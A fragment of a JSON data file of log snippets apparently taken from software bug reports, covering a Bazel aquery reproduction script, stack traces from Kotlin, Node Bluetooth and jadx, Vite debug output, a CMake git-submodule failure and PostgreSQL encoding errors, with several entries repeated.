        "logs": "#!/bin/bash\r\n\r\nWORKSPACE_DIR=$(mktemp -d)\r\nLOCAL_REPOSITORY_DIR=$(mktemp -d)\r\n\r\necho \"WORKSPACE:${WORKSPACE_DIR}\"\r\necho \"LOCAL_REPOSITORY_DIR:${LOCAL_REPOSITORY_DIR}\"\r\n\r\n# Write out a workspace file referencing\r\n# the local repository.\r\ncat << EOF > \"${WORKSPACE_DIR}/WORKSPACE\"\r\nworkspace(name = \"root\")\r\n\r\nlocal_repository(\r\n   name = \"external_001\",\r\n   path = \"${LOCAL_REPOSITORY_DIR}\",\r\n)\r\nEOF\r\n\r\ncat << EOF > \"${LOCAL_REPOSITORY_DIR}/WORKSPACE\"\r\nworkspace(name = \"external_001\")\r\nEOF\r\n\r\n\r\n# Now we can make a few targets, so aquery has\r\n# something to report. We will mirror the BUILD.bazel files\r\n\r\nfor dir in ${WORKSPACE_DIR} ${LOCAL_REPOSITORY_DIR}; do\r\ncat << EOF > \"${dir}/script1.sh\"\r\n#/bin/bash\r\necho \"this is script 1\"\r\nEOF\r\n\r\ncat << EOF > \"${dir}/script2.sh\"\r\n#/bin/bash\r\necho \"this is script 2\"\r\nEOF\r\n\r\ncat << EOF > \"${dir}/BUILD.bazel\"\r\npackage(\r\n   default_visibility = [\"//visibility:public\"],\r\n)\r\n\r\nsh_binary(\r\n   name = \"script1\",\r\n   srcs =[\"script1.sh\"],\r\n)\r\n\r\nsh_binary(\r\n   name = \"script2\",\r\n   srcs =[\"script2.sh\"],\r\n)\r\nEOF\r\n\r\ndone\r\n\r\n(\r\n   cd \"${WORKSPACE_DIR}\"\r\n\r\n   set -x\r\n   # Queries in the root workspace, all return success\r\n   bazel aquery '//:script1'\r\n   bazel aquery '//:all'\r\n   bazel aquery '//...'\r\n\r\n   # Now on the external repository, the \"//...\" will fail\r\n   bazel aquery '@external_001//:script1'\r\n   bazel aquery '@external_001//:all'\r\n   bazel aquery '@external_001//...'\r\n)\r\n\r\nrm -rf \"${WORKSPACE_DIR}\"\r\nrm -rf \"${LOCAL_REPOSITORY_DIR}\""
    },
    {
        "logs": "ERROR: Error doing post analysis query: Evaluation of query \"@external_001//...\" failed: no targets found beneath ''"
    },
    {
        "logs": "typescript\r\n\r\nexport enum RequestType {\r\n    launch,\r\n    kill,\r\n    authorise,\r\n    share\r\n}\r\n\r\nexport enum Signal {\r\n    Ok,\r\n    Error_Denied\r\n    Error_Invalid\r\n}\r\n\r\nexport namespace RequestHandlers extends Record<RequestType, () => Signal> {\r\n    export function launch() {\r\n        // ...\r\n        return Signal.Ok\r\n    }\r\n    // ...\r\n}\r\n\r\nexport default function handleRequest<Handler extends keyof typeof RequestHandlers>(request: Handler): ReturnType<RequestHandlers[Handler]> {\r\n    if (request in RequestHandlers)\r\n        return requestHandlers[request]();\r\n}"
    },
    {
        "logs": "typescript\r\n\r\nexport enum RequestType {\r\n    launch,\r\n    kill,\r\n    authorise,\r\n    share\r\n}\r\n\r\nexport enum Signal {\r\n    Ok,\r\n    Error_Denied\r\n    Error_Invalid\r\n}\r\n\r\nexport namespace RequestHandlers extends Record<RequestType, () => Signal> {\r\n    export function launch() {\r\n        // ...\r\n        return Signal.Ok\r\n    }\r\n    // ...\r\n}\r\n\r\nexport default function handleRequest<Handler extends keyof typeof RequestHandlers>(request: Handler): ReturnType<RequestHandlers[Handler]> {\r\n    if (request in RequestHandlers)\r\n        return requestHandlers[request]();\r\n}"
    },
    {
        "logs": "$ ki -h\r\nUsage: ki [-h] [--version] \r\n\r\n  -h, --help                Prints help\r\n  --version                 Print version\r\nException in thread \"main\" kotlinx.cli.HelpPrintedException\r\n\tat kotlinx.cli.FlagArgumentsKt$help$1.invoke(FlagArguments.kt:96)\r\n\tat kotlinx.cli.FlagAction$DefaultImpls.invoke(Actions.kt:9)\r\n\tat kotlinx.cli.FlagActionBase.invoke(FlagArguments.kt:4)\r\n\tat kotlinx.cli.CommandLineParser.doParse(CommandLineParser.kt:56)\r\n\tat kotlinx.cli.CommandLineParser.parseTokenized(CommandLineParser.kt:21)\r\n\tat kotlinx.cli.CommandLineParser.parse(CommandLineParser.kt:11)\r\n\tat kotlinx.cli.CommandLineParser.parse(CommandLineParser.kt:7)\r\n\tat kotlinx.cli.ParseKt.parse(parse.kt:8)\r\n\tat org.jetbrains.kotlinx.ki.shell.KotlinShell.main(KotlinShell.kt:22)"
    },
    {
        "logs": "$ ki -h\r\nUsage: ki [-h] [--version] \r\n\r\n  -h, --help                Prints help\r\n  --version                 Print version\r\nException in thread \"main\" kotlinx.cli.HelpPrintedException\r\n\tat kotlinx.cli.FlagArgumentsKt$help$1.invoke(FlagArguments.kt:96)\r\n\tat kotlinx.cli.FlagAction$DefaultImpls.invoke(Actions.kt:9)\r\n\tat kotlinx.cli.FlagActionBase.invoke(FlagArguments.kt:4)\r\n\tat kotlinx.cli.CommandLineParser.doParse(CommandLineParser.kt:56)\r\n\tat kotlinx.cli.CommandLineParser.parseTokenized(CommandLineParser.kt:21)\r\n\tat kotlinx.cli.CommandLineParser.parse(CommandLineParser.kt:11)\r\n\tat kotlinx.cli.CommandLineParser.parse(CommandLineParser.kt:7)\r\n\tat kotlinx.cli.ParseKt.parse(parse.kt:8)\r\n\tat org.jetbrains.kotlinx.ki.shell.KotlinShell.main(KotlinShell.kt:22)"
    },
    {
        "logs": "shell\nvite:config bundled config file loaded in 207.83ms +0ms\r\n  vite:config using resolved config: {\r\n  vite:config   plugins: [\r\n  vite:config     'vite:pre-alias',\r\n  vite:config     'alias',\r\n  vite:config     'vite:react-babel',\r\n  vite:config     'vite:react-refresh',\r\n  vite:config     'vite:react-jsx',\r\n  vite:config     'vite:modulepreload-polyfill',\r\n  vite:config     'vite:resolve',\r\n  vite:config     'vite:html-inline-proxy',\r\n  vite:config     'vite:css',\r\n  vite:config     'vite:esbuild',\r\n  vite:config     'vite:json',\r\n  vite:config     'vite:wasm',\r\n  vite:config     'vite:worker',\r\n  vite:config     'vite:worker-import-meta-url',\r\n  vite:config     'vite:asset',\r\n  vite:config     'vite:define',\r\n  vite:config     'vite:css-post',\r\n  vite:config     'vite:client-inject',\r\n  vite:config     'vite:import-analysis'\r\n  vite:config   ],\r\n  vite:config   server: {\r\n  vite:config     preTransformRequests: true,\r\n  vite:config     fs: { strict: true, allow: [Array], deny: [Array] }\r\n  vite:config   },\r\n  vite:config   resolve: { dedupe: [ 'react', 'react-dom' ], alias: [ [Object], [Object] ] },\r\n  vite:config   optimizeDeps: {\r\n  vite:config     include: [ 'react/jsx-dev-runtime' ],\r\n  vite:config     esbuildOptions: { keepNames: undefined, preserveSymlinks: undefined }\r\n  vite:config   },\r\n  vite:config   configFile: '/Users/stickb/Code/scratch/vite-gboost-ui-error/vite.config.ts',\r\n  vite:config   configFileDependencies: [ 'vite.config.ts' ],\r\n  vite:config   inlineConfig: {\r\n  vite:config     root: undefined,\r\n  vite:config     base: undefined,\r\n  vite:config     mode: undefined,\r\n  vite:config     configFile: undefined,\r\n  vite:config     logLevel: undefined,\r\n  vite:config     clearScreen: undefined,\r\n  vite:config     server: {}\r\n  vite:config   },\r\n  vite:config   root: '/Users/stickb/Code/scratch/vite-gboost-ui-error',\r\n  vite:config   base: '/',\r\n  vite:config   publicDir: '/Users/stickb/Code/scratch/vite-gboost-ui-error/public',\r\n[Truncated]\n  vite:config       [Object], [Object],\r\n  vite:config       [Object], [Object],\r\n  vite:config       [Object], [Object]\r\n  vite:config     ],\r\n  vite:config     rollupOptions: {}\r\n  vite:config   }\r\n  vite:config } +6ms\r\n  vite:deps Hash is consistent. Skipping. Use --force to override. +0ms"
    },
    {
        "logs": "2018-05-14 15:24:52\r\nFull thread dump Java HotSpot(TM) 64-Bit Server VM (25.74-b02 mixed mode):\r\n\r\n\"pool-1-thread-4\" #13 prio=5 os_prio=0 tid=0x000000003da7d000 nid=0x1214 runnable [0x000000004502e000]\r\n   java.lang.Thread.State: RUNNABLE\r\n        at java.util.Collections$UnmodifiableCollection$1.next(Collections.java:1042)\r\n        at jadx.core.dex.visitors.regions.RegionMaker.processIf(RegionMaker.java:657)\r\n        at jadx.core.dex.visitors.regions.RegionMaker.traverse(RegionMaker.java:127)\r\n        at jadx.core.dex.visitors.regions.RegionMaker.makeRegion(RegionMaker.java:94)\r\n        at jadx.core.dex.visitors.regions.RegionMaker.makeEndlessLoop(RegionMaker.java:324)\r\n        at jadx.core.dex.visitors.regions.RegionMaker.processLoop(RegionMaker.java:176)\r\n        at jadx.core.dex.visitors.regions.RegionMaker.traverse(RegionMaker.java:110)\r\n        at jadx.core.dex.visitors.regions.RegionMaker.makeRegion(RegionMaker.java:94)\r\n        at jadx.core.dex.visitors.regions.RegionMakerVisitor.visit(RegionMakerVisitor.java:49)\r\n        at jadx.core.dex.visitors.DepthTraversal.visit(DepthTraversal.java:31)\r\n        at jadx.core.dex.visitors.DepthTraversal.visit(DepthTraversal.java:17)\r\n        at jadx.core.ProcessClass.process(ProcessClass.java:34)\r\n        - locked <0x0000000409d95550> (a jadx.core.dex.info.ClassInfo)\r\n        at jadx.core.ProcessClass.processDependencies(ProcessClass.java:60)\r\n        at jadx.core.ProcessClass.process(ProcessClass.java:39)\r\n        - locked <0x0000000406a69d90> (a jadx.core.dex.info.ClassInfo)\r\n        at jadx.api.JadxDecompiler.processClass(JadxDecompiler.java:282)\r\n        at jadx.api.JavaClass.decompile(JavaClass.java:62)\r\n        - locked <0x00000004145b11d0> (a jadx.api.JavaClass)\r\n        at jadx.api.JadxDecompiler.lambda$appendSourcesSave$0(JadxDecompiler.java:200)\r\n        at jadx.api.JadxDecompiler$$Lambda$8/1896305732.run(Unknown Source)\r\n        at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142)\r\n        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617)\r\n        at java.lang.Thread.run(Thread.java:745)\r\n\r\n   Locked ownable synchronizers:\r\n        - <0x000000040abe4ee8> (a java.util.concurrent.ThreadPoolExecutor$Worker)\r\n\r\n\"pool-1-thread-3\" #12 prio=5 os_prio=0 tid=0x000000003ead7000 nid=0x1a34 waiting for monitor entry [0x000000004412e000]\r\n   java.lang.Thread.State: BLOCKED (on object monitor)\r\n        at jadx.core.ProcessClass.process(ProcessClass.java:28)\r\n        - waiting to lock <0x0000000409d95550> (a jadx.core.dex.info.ClassInfo)\r\n        at jadx.core.ProcessClass.processDependencies(ProcessClass.java:60)\r\n        at jadx.core.ProcessClass.process(ProcessClass.java:39)\r\n        - locked <0x0000000409d87008> (a jadx.core.dex.info.ClassInfo)\r\n        at jadx.api.JadxDecompiler.processClass(JadxDecompiler.java:282)\r\n        at jadx.api.JavaClass.decompile(JavaClass.java:62)\r\n        - locked <0x00000004145af630> (a jadx.api.JavaClass)\r\n        at jadx.api.JadxDecompiler.lambda$appendSourcesSave$0(JadxDecompiler.java:200)\r\n        at jadx.api.JadxDecompiler$$Lambda$8/1896305732.run(Unknown Source)\r\n        at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142)\r\n        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617)\r\n        at java.lang.Thread.run(Thread.java:745)\r\n\r\n   Locked ownable synchronizers:\r\n        - <0x000000040ad84e98> (a java.util.concurrent.ThreadPoolExecutor$Worker)\r\n\r\n\"pool-1-thread-2\" #11 prio=5 os_prio=0 tid=0x000000003f866000 nid=0x1098 waiting for monitor entry [0x000000004322e000]\r\n   java.lang.Thread.State: BLOCKED (on object monitor)\r\n        at jadx.core.ProcessClass.process(ProcessClass.java:28)\r\n        - waiting to lock <0x0000000409d95550> (a jadx.core.dex.info.ClassInfo)\r\n        at jadx.core.ProcessClass.processDependencies(ProcessClass.java:60)\r\n        at jadx.core.ProcessClass.process(ProcessClass.java:39)\r\n        - locked <0x000000040601fa68> (a jadx.core.dex.info.ClassInfo)\r\n        at jadx.api.JadxDecompiler.processClass(JadxDecompiler.java:282)\r\n        at jadx.api.JavaClass.decompile(JavaClass.java:62)\r\n        - locked <0x0000000414598ae0> (a jadx.api.JavaClass)\r\n        at jadx.api.JadxDecompiler.lambda$appendSourcesSave$0(JadxDecompiler.java:200)\r\n        at jadx.api.JadxDecompiler$$Lambda$8/1896305732.run(Unknown Source)\r\n        at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142)\r\n        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617)\r\n        at java.lang.Thread.run(Thread.java:745)\r\n\r\n   Locked ownable synchronizers:\r\n        - <0x000000040ad85330> (a java.util.concurrent.ThreadPoolExecutor$Worker)\r\n\r\n\"pool-1-thread-1\" #10 prio=5 os_prio=0 tid=0x000000003f168800 nid=0x17e4 waiting for monitor entry [0x000000004232e000]\r\n   java.lang.Thread.State: BLOCKED (on object monitor)\r\n        at jadx.core.ProcessClass.process(ProcessClass.java:28)\r\n        - waiting to lock <0x0000000409d95550> (a jadx.core.dex.info.ClassInfo)\r\n        at jadx.core.ProcessClass.processDependencies(ProcessClass.java:60)\r\n        at jadx.core.ProcessClass.process(ProcessClass.java:39)\r\n        - locked <0x0000000409c26c48> (a jadx.core.dex.info.ClassInfo)\r\n[Truncated]\n   Locked ownable synchronizers:\r\n        - None\r\n\r\n\"VM Thread\" os_prio=2 tid=0x0000000036977800 nid=0x1aac runnable\r\n\r\n\"GC task thread#0 (ParallelGC)\" os_prio=0 tid=0x0000000000f28000 nid=0x1574 runnable\r\n\r\n\"GC task thread#1 (ParallelGC)\" os_prio=0 tid=0x0000000000f29800 nid=0x388 runnable\r\n\r\n\"GC task thread#2 (ParallelGC)\" os_prio=0 tid=0x0000000000f2b000 nid=0xf78 runnable\r\n\r\n\"GC task thread#3 (ParallelGC)\" os_prio=0 tid=0x0000000000f2c800 nid=0x594 runnable\r\n\r\n\"VM Periodic Task Thread\" os_prio=2 tid=0x000000003bb57000 nid=0x14f8 waiting on condition\r\n\r\nJNI global references: 302"
    },
    {
        "logs": "2018-05-14 15:24:52\r\nFull thread dump Java HotSpot(TM) 64-Bit Server VM (25.74-b02 mixed mode):\r\n\r\n\"pool-1-thread-4\" #13 prio=5 os_prio=0 tid=0x000000003da7d000 nid=0x1214 runnable [0x000000004502e000]\r\n   java.lang.Thread.State: RUNNABLE\r\n        at java.util.Collections$UnmodifiableCollection$1.next(Collections.java:1042)\r\n        at jadx.core.dex.visitors.regions.RegionMaker.processIf(RegionMaker.java:657)\r\n        at jadx.core.dex.visitors.regions.RegionMaker.traverse(RegionMaker.java:127)\r\n        at jadx.core.dex.visitors.regions.RegionMaker.makeRegion(RegionMaker.java:94)\r\n        at jadx.core.dex.visitors.regions.RegionMaker.makeEndlessLoop(RegionMaker.java:324)\r\n        at jadx.core.dex.visitors.regions.RegionMaker.processLoop(RegionMaker.java:176)\r\n        at jadx.core.dex.visitors.regions.RegionMaker.traverse(RegionMaker.java:110)\r\n        at jadx.core.dex.visitors.regions.RegionMaker.makeRegion(RegionMaker.java:94)\r\n        at jadx.core.dex.visitors.regions.RegionMakerVisitor.visit(RegionMakerVisitor.java:49)\r\n        at jadx.core.dex.visitors.DepthTraversal.visit(DepthTraversal.java:31)\r\n        at jadx.core.dex.visitors.DepthTraversal.visit(DepthTraversal.java:17)\r\n        at jadx.core.ProcessClass.process(ProcessClass.java:34)\r\n        - locked <0x0000000409d95550> (a jadx.core.dex.info.ClassInfo)\r\n        at jadx.core.ProcessClass.processDependencies(ProcessClass.java:60)\r\n        at jadx.core.ProcessClass.process(ProcessClass.java:39)\r\n        - locked <0x0000000406a69d90> (a jadx.core.dex.info.ClassInfo)\r\n        at jadx.api.JadxDecompiler.processClass(JadxDecompiler.java:282)\r\n        at jadx.api.JavaClass.decompile(JavaClass.java:62)\r\n        - locked <0x00000004145b11d0> (a jadx.api.JavaClass)\r\n        at jadx.api.JadxDecompiler.lambda$appendSourcesSave$0(JadxDecompiler.java:200)\r\n        at jadx.api.JadxDecompiler$$Lambda$8/1896305732.run(Unknown Source)\r\n        at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142)\r\n        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617)\r\n        at java.lang.Thread.run(Thread.java:745)\r\n\r\n   Locked ownable synchronizers:\r\n        - <0x000000040abe4ee8> (a java.util.concurrent.ThreadPoolExecutor$Worker)\r\n\r\n\"pool-1-thread-3\" #12 prio=5 os_prio=0 tid=0x000000003ead7000 nid=0x1a34 waiting for monitor entry [0x000000004412e000]\r\n   java.lang.Thread.State: BLOCKED (on object monitor)\r\n        at jadx.core.ProcessClass.process(ProcessClass.java:28)\r\n        - waiting to lock <0x0000000409d95550> (a jadx.core.dex.info.ClassInfo)\r\n        at jadx.core.ProcessClass.processDependencies(ProcessClass.java:60)\r\n        at jadx.core.ProcessClass.process(ProcessClass.java:39)\r\n        - locked <0x0000000409d87008> (a jadx.core.dex.info.ClassInfo)\r\n        at jadx.api.JadxDecompiler.processClass(JadxDecompiler.java:282)\r\n        at jadx.api.JavaClass.decompile(JavaClass.java:62)\r\n        - locked <0x00000004145af630> (a jadx.api.JavaClass)\r\n        at jadx.api.JadxDecompiler.lambda$appendSourcesSave$0(JadxDecompiler.java:200)\r\n        at jadx.api.JadxDecompiler$$Lambda$8/1896305732.run(Unknown Source)\r\n        at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142)\r\n        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617)\r\n        at java.lang.Thread.run(Thread.java:745)\r\n\r\n   Locked ownable synchronizers:\r\n        - <0x000000040ad84e98> (a java.util.concurrent.ThreadPoolExecutor$Worker)\r\n\r\n\"pool-1-thread-2\" #11 prio=5 os_prio=0 tid=0x000000003f866000 nid=0x1098 waiting for monitor entry [0x000000004322e000]\r\n   java.lang.Thread.State: BLOCKED (on object monitor)\r\n        at jadx.core.ProcessClass.process(ProcessClass.java:28)\r\n        - waiting to lock <0x0000000409d95550> (a jadx.core.dex.info.ClassInfo)\r\n        at jadx.core.ProcessClass.processDependencies(ProcessClass.java:60)\r\n        at jadx.core.ProcessClass.process(ProcessClass.java:39)\r\n        - locked <0x000000040601fa68> (a jadx.core.dex.info.ClassInfo)\r\n        at jadx.api.JadxDecompiler.processClass(JadxDecompiler.java:282)\r\n        at jadx.api.JavaClass.decompile(JavaClass.java:62)\r\n        - locked <0x0000000414598ae0> (a jadx.api.JavaClass)\r\n        at jadx.api.JadxDecompiler.lambda$appendSourcesSave$0(JadxDecompiler.java:200)\r\n        at jadx.api.JadxDecompiler$$Lambda$8/1896305732.run(Unknown Source)\r\n        at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142)\r\n        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617)\r\n        at java.lang.Thread.run(Thread.java:745)\r\n\r\n   Locked ownable synchronizers:\r\n        - <0x000000040ad85330> (a java.util.concurrent.ThreadPoolExecutor$Worker)\r\n\r\n\"pool-1-thread-1\" #10 prio=5 os_prio=0 tid=0x000000003f168800 nid=0x17e4 waiting for monitor entry [0x000000004232e000]\r\n   java.lang.Thread.State: BLOCKED (on object monitor)\r\n        at jadx.core.ProcessClass.process(ProcessClass.java:28)\r\n        - waiting to lock <0x0000000409d95550> (a jadx.core.dex.info.ClassInfo)\r\n        at jadx.core.ProcessClass.processDependencies(ProcessClass.java:60)\r\n        at jadx.core.ProcessClass.process(ProcessClass.java:39)\r\n        - locked <0x0000000409c26c48> (a jadx.core.dex.info.ClassInfo)\r\n[Truncated]\n   Locked ownable synchronizers:\r\n        - None\r\n\r\n\"VM Thread\" os_prio=2 tid=0x0000000036977800 nid=0x1aac runnable\r\n\r\n\"GC task thread#0 (ParallelGC)\" os_prio=0 tid=0x0000000000f28000 nid=0x1574 runnable\r\n\r\n\"GC task thread#1 (ParallelGC)\" os_prio=0 tid=0x0000000000f29800 nid=0x388 runnable\r\n\r\n\"GC task thread#2 (ParallelGC)\" os_prio=0 tid=0x0000000000f2b000 nid=0xf78 runnable\r\n\r\n\"GC task thread#3 (ParallelGC)\" os_prio=0 tid=0x0000000000f2c800 nid=0x594 runnable\r\n\r\n\"VM Periodic Task Thread\" os_prio=2 tid=0x000000003bb57000 nid=0x14f8 waiting on condition\r\n\r\nJNI global references: 302"
    },
    {
        "logs": "RangeError: Index out of range\r\n    at checkOffset (buffer.js:977:11)\r\n    at Buffer.readUInt8 (buffer.js:1015:5)\r\n    at Hci.processCmdCompleteEvent (C:\\Dev\\Code\\Falaffel\\BLE\\node_modules\\noble\\lib\\hci-socket\\hci.js:566:25)\r\n    at Hci.onSocketData (C:\\Dev\\Code\\Falaffel\\BLE\\node_modules\\noble\\lib\\hci-socket\\hci.js:461:12)\r\n    at emitOne (events.js:116:13)\r\n    at BluetoothHciSocket.emit (events.js:211:7)\r\n    at BluetoothHciSocket.onHciEventEndpointData (C:\\Dev\\Code\\Falaffel\\BLE\\node_modules\\bluetooth-hci-socket\\lib\\usb.js:190:10)\r\n    at emitOne (events.js:116:13)\r\n    at InEndpoint.emit (events.js:211:7)\r\n    at Transfer.transferDone (C:\\Dev\\Code\\Falaffel\\BLE\\node_modules\\usb\\usb.js:328:9)"
    },
    {
        "logs": "this.address = result.toString('hex').match(/.{1,2}/g).reverse().join(':');\r\n                                                          ^\r\nTypeError: Cannot read property 'reverse' of null\r\n    at Hci.processCmdCompleteEvent (C:\\Dev\\Code\\Falaffel\\BLE\\node_modules\\noble\\lib\\hci-socket\\hci.js:582:59)\r\n    at Hci.onSocketData (C:\\Dev\\Code\\Falaffel\\BLE\\node_modules\\noble\\lib\\hci-socket\\hci.js:461:12)\r\n    at emitOne (events.js:116:13)\r\n    at BluetoothHciSocket.emit (events.js:211:7)\r\n    at BluetoothHciSocket.onHciEventEndpointData (C:\\Dev\\Code\\Falaffel\\BLE\\node_modules\\bluetooth-hci-socket\\lib\\usb.js:190:10)\r\n    at emitOne (events.js:116:13)\r\n    at InEndpoint.emit (events.js:211:7)\r\n    at Transfer.transferDone (C:\\Dev\\Code\\Falaffel\\BLE\\node_modules\\usb\\usb.js:328:9)"
    },
    {
        "logs": "package com.spring.boot.issue13189\r\n\r\nimport com.hazelcast.client.config.ClientConfig\r\nimport org.springframework.boot.autoconfigure.EnableAutoConfiguration\r\nimport org.springframework.boot.autoconfigure.SpringBootApplication\r\nimport org.springframework.boot.context.properties.ConfigurationProperties\r\nimport org.springframework.boot.runApplication\r\nimport org.springframework.context.ConfigurableApplicationContext\r\nimport org.springframework.context.annotation.Bean\r\n\r\n@SpringBootApplication\r\n@EnableAutoConfiguration(exclude = [org.springframework.boot.autoconfigure.hazelcast.HazelcastAutoConfiguration::class])\r\nclass Issue13189Application {\r\n    @Bean\r\n    @ConfigurationProperties(\"hazelcast.client\")\r\n    fun myClientConfig() = ClientConfig()\r\n}\r\n\r\nfun main(args: Array<String>) {\r\n    val context: ConfigurableApplicationContext = runApplication<Issue13189Application>(*args)\r\n    println(\"ClientConfig.instanceName = \" + context.getBean(ClientConfig::class.java).instanceName)\r\n    println(\"ClientConfig.networkConfig.addresses = \" + context.getBean(ClientConfig::class.java).networkConfig.addresses)\r\n}"
    },
    {
        "logs": "  Checking Build System\r\n  Creating directories for 'mp4v2'\r\n  Building Custom Rule C:/Users/username_0/Documents/Dev/orig/ultraschall-plugin/CMakeLists.txt\r\n  Performing download step (git clone) for 'mp4v2'\r\n  Creating directories for 'curl'\r\n  Creating directories for 'expat'\r\n  Building Custom Rule C:/Users/username_0/Documents/Dev/orig/ultraschall-plugin/CMakeLists.txt\r\n  Performing download step (git clone) for 'curl'\r\n  Creating directories for 'json11'\r\n  Building Custom Rule C:/Users/username_0/Documents/Dev/orig/ultraschall-plugin/CMakeLists.txt\r\n  Performing download step (git clone) for 'expat'\r\n  Building Custom Rule C:/Users/username_0/Documents/Dev/orig/ultraschall-plugin/CMakeLists.txt\r\n  Performing download step (git clone) for 'json11'\r\n  CMake Error at json11-stamp/json11-download-Debug.cmake:37 (message):\r\n    Command failed: 1\r\n\r\n     'C:/Program Files/CMake/bin/cmake.exe' '-P' 'C:/Users/username_0/Documents/Dev/orig/ultraschall-plugin/_build/libjson1\r\n  1/tmp/json11-gitclone.cmake'\r\n\r\n    See also\r\n\r\n      C:/Users/username_0/Documents/Dev/orig/ultraschall-plugin/_build/libjson11/src/json11-stamp/json11-download-*.log\r\n\r\n  -- stdout output is:\r\n\r\n  -- stderr output is:\r\n  Cloning into 'json11'...\r\n  Note: checking out 'v1.0.0'.\r\n\r\n  You are in 'detached HEAD' state. You can look around, make experimental\r\n  changes and commit them, and you can discard any commits you make in this\r\n  state without impacting any branches by performing another checkout.\r\n\r\n  If you want to create a new branch to retain commits you create, you may\r\n  do so (now or later) by using -b with the checkout command again. Example:\r\n\r\n    git checkout -b <new-branch-name>\r\n\r\n  HEAD is now at ec4e452 Change Json map/vector conversions to invoke begin() directly (#110)\r\n  fatal: 'submodule' appears to be a git command, but we were not\r\n  able to execute it. Maybe git-submodule is broken?\r\n  CMake Error at C:/Users/username_0/Documents/Dev/orig/ultraschall-plugin/_build/libjson11/tmp/json11-gitclone.cmake:49 (m\r\n  essage):\r\n    Failed to update submodules in:\r\n    'C:/Users/username_0/Documents/Dev/orig/ultraschall-plugin/_build/libjson11/src/json11'\r\n\r\n  CMake Error at json11-stamp/json11-download-Debug.cmake:47 (message):\r\n    Stopping after outputting logs.\r\n\r\nC:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\Community\\MSBuild\\Microsoft\\VC\\v160\\Microsoft.CppCommon.targets(230\r\n,5): error MSB6006: \"cmd.exe\" wurde mit dem Code 1 beendet. [C:\\Users\\username_0\\Documents\\Dev\\orig\\ultraschall-plugin\\_bui\r\nld\\json11-build.vcxproj]"
    },
    {
        "logs": "  Checking Build System\r\n  Creating directories for 'mp4v2'\r\n  Building Custom Rule C:/Users/username_0/Documents/Dev/orig/ultraschall-plugin/CMakeLists.txt\r\n  Performing download step (git clone) for 'mp4v2'\r\n  Creating directories for 'curl'\r\n  Creating directories for 'expat'\r\n  Building Custom Rule C:/Users/username_0/Documents/Dev/orig/ultraschall-plugin/CMakeLists.txt\r\n  Performing download step (git clone) for 'curl'\r\n  Creating directories for 'json11'\r\n  Building Custom Rule C:/Users/username_0/Documents/Dev/orig/ultraschall-plugin/CMakeLists.txt\r\n  Performing download step (git clone) for 'expat'\r\n  Building Custom Rule C:/Users/username_0/Documents/Dev/orig/ultraschall-plugin/CMakeLists.txt\r\n  Performing download step (git clone) for 'json11'\r\n  CMake Error at json11-stamp/json11-download-Debug.cmake:37 (message):\r\n    Command failed: 1\r\n\r\n     'C:/Program Files/CMake/bin/cmake.exe' '-P' 'C:/Users/username_0/Documents/Dev/orig/ultraschall-plugin/_build/libjson1\r\n  1/tmp/json11-gitclone.cmake'\r\n\r\n    See also\r\n\r\n      C:/Users/username_0/Documents/Dev/orig/ultraschall-plugin/_build/libjson11/src/json11-stamp/json11-download-*.log\r\n\r\n  -- stdout output is:\r\n\r\n  -- stderr output is:\r\n  Cloning into 'json11'...\r\n  Note: checking out 'v1.0.0'.\r\n\r\n  You are in 'detached HEAD' state. You can look around, make experimental\r\n  changes and commit them, and you can discard any commits you make in this\r\n  state without impacting any branches by performing another checkout.\r\n\r\n  If you want to create a new branch to retain commits you create, you may\r\n  do so (now or later) by using -b with the checkout command again. Example:\r\n\r\n    git checkout -b <new-branch-name>\r\n\r\n  HEAD is now at ec4e452 Change Json map/vector conversions to invoke begin() directly (#110)\r\n  fatal: 'submodule' appears to be a git command, but we were not\r\n  able to execute it. Maybe git-submodule is broken?\r\n  CMake Error at C:/Users/username_0/Documents/Dev/orig/ultraschall-plugin/_build/libjson11/tmp/json11-gitclone.cmake:49 (m\r\n  essage):\r\n    Failed to update submodules in:\r\n    'C:/Users/username_0/Documents/Dev/orig/ultraschall-plugin/_build/libjson11/src/json11'\r\n\r\n  CMake Error at json11-stamp/json11-download-Debug.cmake:47 (message):\r\n    Stopping after outputting logs.\r\n\r\nC:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\Community\\MSBuild\\Microsoft\\VC\\v160\\Microsoft.CppCommon.targets(230\r\n,5): error MSB6006: \"cmd.exe\" wurde mit dem Code 1 beendet. [C:\\Users\\username_0\\Documents\\Dev\\orig\\ultraschall-plugin\\_bui\r\nld\\json11-build.vcxproj]"
    },
    {
        "logs": "2019-10-18T15:12:42-0400 warning: bind $1 type (TIMESTAMPTZ) does not match expected parameter type (JSON)\r\n2019-10-18T15:12:42-0400 error: invalid byte sequence for encoding \"UTF8\": 0x00 (report_invalid_encoding)"
    },
    {
        "logs": "2019-10-18T15:12:42-0400 warning: bind $1 type (TIMESTAMPTZ) does not match expected parameter type (JSON)\r\n2019-10-18T15:12:42-0400 error: invalid byte sequence for encoding \"UTF8\": 0x00 (report_invalid_encoding)"
    },
    {
        "logs": "2019-10-18T15:12:42-0400 warning: bind $1 type (TIMESTAMPTZ) does not match expected parameter type (JSON)\r\n2019-10-18T15:12:42-0400 error: invalid byte sequence for encoding \"UTF8\": 0x00 (report_invalid_encoding)"
    },
    {
